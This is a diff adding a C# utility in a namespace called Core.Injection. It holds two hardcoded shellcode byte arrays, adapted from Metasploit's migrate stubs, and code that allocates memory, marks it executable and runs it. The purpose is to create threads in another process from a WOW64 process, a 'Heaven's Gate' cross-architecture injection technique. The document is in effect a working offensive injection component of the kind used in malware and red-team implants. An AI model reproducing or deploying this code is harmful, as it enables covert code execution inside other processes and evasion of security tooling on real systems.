@@ -1,0 +1,128 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using Core.WindowsInternals;
+
+namespace Core.Injection
+{
+    public static class Util
+    {
+        public static void CreateRemoteThread64(uint hProcess, uint lpStartAddress, uint lpParameter)
+        {
+            //Bail out on non-x86/wow process
+            if (IntPtr.Size == 8)
+            {
+                if (!IsWow64())
+                {
+                    return;
+                }
+            }
+
+            //TOM W modified version of: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
+            byte[] migrateExecuteX64 =
+            {
+                0x55, 0x89, 0xE5, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0x8B, 0x37, 0x8B, 0x4F, 0x08, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x83, 0xC0, 0x2A, 0x83, 0xEC, 0x08, 0x89, 0xE2,
+                0xC7, 0x42, 0x04, 0x33, 0x00, 0x00, 0x00, 0x89, 0x02, 0xE8, 0x0E, 0x00, 0x00, 0x00, 0x66, 0x8C, 0xD8, 0x8E, 0xD0, 0x83, 0xC4, 0x14, 0x5F, 0x5E, 0x5D, 0xC2, 0x08,
+                0x00, 0x8B, 0x3C, 0x24, 0xFF, 0x2A, 0x48, 0x31, 0xC0,
+                0x57, 0xFF, 0xD6, 0x5F, 0x50, 0xC7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00, 0x89, 0x3C, 0x24, 0xFF, 0x2C, 0x24,
+            };
+
+            //TOM W modified version of: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
+            byte[] migrateWowNativeX =
+            {
+                0xFC, 0x48, 0x89, 0xCE, 0x48, 0x89, 0xE7, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65,
+                0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+                0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1,
+                0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78, 0x18, 0x0B, 0x02, 0x75,
+                0x72, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3,
+                0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
+                0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39,
+                0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88,
+                0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59,
+                0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x4F, 0xFF, 0xFF, 0xFF,
+                0x5D, 0x4D, 0x31, 0xC9, 0x41, 0x51, 0x48, 0x8D, 0x46, 0x18, 0x50, 0xFF, 0x76, 0x10, 0xFF, 0x76, 0x08, 0x41, 0x51, 0x41, 0x51, 0x41, 0xB8, 0x00, 0x00, 0x00, 0x00,
+                0x48, 0x31, 0xD2, 0x48, 0x8B, 0x0E, 0x41, 0xBA, 0xC8,
+                0x38, 0xA4, 0x40, 0xFF, 0xD5, 0x48, 0x85, 0xC0, 0x74, 0x07, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x05, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50, 0x48,
+                0x89, 0xFC, 0xC3,
+            };
+
+
+            var pExec64Address = Internals.VirtualAlloc(IntPtr.Zero, (IntPtr) (migrateExecuteX64.Length * 2), Internals.AllocationType.Commit |
+                                                                                                              Internals.AllocationType.Reserve, Internals.PAGE_READWRITE);
+
+            if (pExec64Address != IntPtr.Zero)
+            {
+                Marshal.Copy(migrateExecuteX64, 0, pExec64Address, migrateExecuteX64.Length);
+
+                var pFunc = Internals.VirtualAlloc(IntPtr.Zero, (IntPtr) (migrateWowNativeX.Length * 2), Internals.AllocationType.Commit |
+                                                                                                         Internals.AllocationType.Reserve, Internals.PAGE_READWRITE);
+
+                if (pFunc != IntPtr.Zero)
+                {
+                    Marshal.Copy(migrateWowNativeX, 0, pFunc, migrateWowNativeX.Length);
+
+                    var pCtx = new Internals.Wow64Context {hProcess = hProcess, lpParameter = lpParameter, lpStartAddress = lpStartAddress, hThread = 0};
+
+                    var pHGlobalCtx = Marshal.AllocHGlobal(Marshal.SizeOf(pCtx));
+
+                    if (pHGlobalCtx != IntPtr.Zero)
+                    {
+                        Marshal.StructureToPtr(pCtx, pHGlobalCtx, false);
+
+                        var pExecX64Ctx = new Internals.Execute64Context {lpParameter = (uint) pHGlobalCtx, lpStartAddress = (uint) pFunc};
+
+                        var pHGlobalExecX64Ctx = Marshal.AllocHGlobal(Marshal.SizeOf(pExecX64Ctx));
+
+                        if (pHGlobalExecX64Ctx != IntPtr.Zero)
+                        {
+                            Marshal.StructureToPtr(pExecX64Ctx, pHGlobalExecX64Ctx, false);
+                            if (!Internals.VirtualProtect(pExec64Address, (uint) (migrateExecuteX64.Length * 2), Internals.PAGE_EXECUTE_READ, out _))
+                            {
+                                Console.WriteLine("Unable to set pExec64Address page protections to RX on CreateRemoteThread");
+                                return;
+                            }
+
+                            if (!Internals.VirtualProtect(pFunc, (uint) (migrateWowNativeX.Length * 2), Internals.PAGE_EXECUTE_READ, out _))
+                            {
+                                Console.WriteLine("Unable to set pFunc page protections to RX on CreateRemoteThread");
+                                return; // TODO handle this with exception handling so can free memory in the finally
+                            }
+
+                            var hThread = Internals.CreateThread(IntPtr.Zero, 0, pExec64Address, pHGlobalExecX64Ctx, 0, out _);
+
+                            if (hThread != 0)
+                            {
+                                Internals.WaitForSingleObject(hThread, 0xFFFFFFFF);
+                            }
+
+                            Marshal.FreeHGlobal(pHGlobalExecX64Ctx);
+                        }
+
+                        Marshal.FreeHGlobal(pHGlobalCtx);
+                    }
+
+                    Internals.VirtualFree(pFunc, (IntPtr) migrateWowNativeX.Length, Internals.AllocationType.Release);
+                }
+
+                Internals.VirtualFree(pExec64Address, (IntPtr) migrateExecuteX64.Length, Internals.AllocationType.Release);
+            }
+        }
+
+        private static bool IsWow64()
+        {
+            if (Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1 ||
+                Environment.OSVersion.Version.Major >= 6)
+            {
+                using var p = Process.GetCurrentProcess();
+                if (!Internals.IsWow64Process(p.Handle, out var retVal))
+                {
+                    return false;
+                }
+
+                return retVal;
+            }
+
+            return false;
+        }
+    }
+}
